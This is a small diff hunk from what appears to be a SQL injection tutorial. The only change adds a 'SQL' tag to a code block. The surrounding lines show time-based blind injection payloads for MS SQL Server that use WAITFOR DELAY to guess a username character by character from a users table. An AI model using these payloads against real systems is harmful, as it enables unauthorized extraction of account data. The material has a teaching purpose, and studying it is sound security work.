@@ -123,7 +123,7 @@ Check how many data are in the data table users. We can see from the query below
 ```
 Finding the username.
 
-```
+```SQL
 -- e.g. guess username (ASCII)
 '; IF (ASCII(LOWER(SUBSTRING((SELECT TOP 1 username FROM users), 1, 1))) > 97) WAITFOR DELAY '00:00:05' --
 '; IF (ASCII(LOWER(SUBSTRING((SELECT TOP 1 username FROM users), 1, 1))) > 98) WAITFOR DELAY '00:00:05' -- and so on
